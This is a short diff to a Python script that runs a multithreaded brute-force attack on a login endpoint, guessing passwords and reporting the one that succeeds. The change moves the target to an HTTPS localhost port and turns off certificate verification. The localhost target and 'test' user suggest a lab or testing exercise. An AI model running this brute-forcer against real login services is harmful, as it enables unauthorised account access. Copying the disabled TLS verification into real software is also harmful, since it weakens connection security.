@@ -1,7 +1,6 @@
 import itertools
 import string
 import requests
-import time
 from timeit import default_timer as timer
 import threading
 
@@ -14,9 +13,9 @@ def parallel_brute_force(length, start, guess , attempts):
         guess = ''.join(guess)
         if len(guess) == 4:
             print(f"Tryng {guess}")
-        url = "http://localhost:8081/login"
+        url = "https://localhost:9443/login"
         body = {'username':'test', 'password': guess}
-        resp = session.post(url, json=body)
+        resp = session.post(url, json=body, verify=False)
         if resp.status_code == 200:
              print(f"Password cracked in {attempts} attempts. The password is {guess}.")
              end = timer()
